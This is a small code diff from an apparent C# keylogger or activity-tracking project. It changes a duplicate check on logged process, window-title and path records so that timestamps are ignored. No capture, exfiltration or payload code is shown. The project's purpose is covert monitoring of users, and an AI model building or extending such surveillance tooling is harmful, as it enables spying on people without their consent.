@@ -66,7 +66,7 @@ namespace key.KeyLogger
             if (start.Count == 1) check = true;
             else
             {
-                var duplicateExists = start.Where(x => x.NameProcess == a.NameProcess && x.Title == a.Title && x.Time == a.Time && x.Path == a.Path).Count();
+                var duplicateExists = start.Where(x => x.NameProcess == a.NameProcess && x.Title == a.Title  && x.Path == a.Path).Count();
                 if (duplicateExists > 1)
                 {
                     check = false;
